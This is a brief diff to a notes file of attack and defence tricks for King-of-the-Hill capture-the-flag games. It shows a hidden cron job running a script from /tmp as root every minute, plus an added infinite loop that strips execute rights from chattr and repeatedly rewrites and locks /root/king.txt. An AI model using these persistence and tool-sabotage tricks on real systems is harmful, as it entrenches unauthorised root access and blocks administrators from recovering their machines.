@@ -74,3 +74,8 @@ KoTH - Attack & defense Tricks
     - chmod +x .persistence.sh
     - vim /etc/crontab
         - * * * * * root /tmp/.persistence.sh
+
+
+
+
+while true; do chmod -x /usr/bin/chattr; set +o noclobber /root/king.txt; ./busybox chattr -ia /root/king.txt; echo msoodb > /root/king.txt; ./busybox chattr +ia /root/king.txt; set -o noclobber /root/king.txt; done
